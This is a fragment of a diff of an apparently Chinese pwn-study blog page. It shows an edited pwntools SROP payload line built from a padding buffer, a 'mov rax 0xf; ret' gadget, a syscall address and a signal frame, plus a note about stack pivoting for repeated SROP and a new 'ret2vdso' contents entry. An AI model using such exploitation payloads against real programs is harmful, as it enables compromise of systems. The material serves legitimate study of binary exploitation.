-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_f_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="n">flat</span><span class="p">(</span><span class="n">signal_frame</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_0xf_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">flat</span><span class="p">(</span><span class="n">signal_frame</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="格式化字符串">格式化字符串</h2>
+</div><p>由于rsp可控，还可利用进行栈迁移，连续多次SROP</p>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20241110220745416.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241110220745416"
+	
+	
+></p>
+<h2 id="格式化字符串">格式化字符串</h2>
 <ul>
 <li>格式化字符串函数接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后参数</li>
 <li>当格式化字符串数量多于变参数量，出现不可预知情况</li>
@@ -9078,7 +9284,7 @@
         
             
         
-        共 121.22k 字 · 共 18篇文章
+        共 122.59k 字 · 共 18篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -9360,6 +9566,7 @@
         <li><a href="#ret2libc">ret2libc</a></li>
         <li><a href="#ret2csu">ret2csu</a></li>
         <li><a href="#ret2dl-resolve">ret2dl-resolve</a></li>
+        <li><a href="#ret2vdso">ret2vdso</a></li>
       </ol>
     </li>
     <li><a href="#花式栈溢出">花式栈溢出</a>
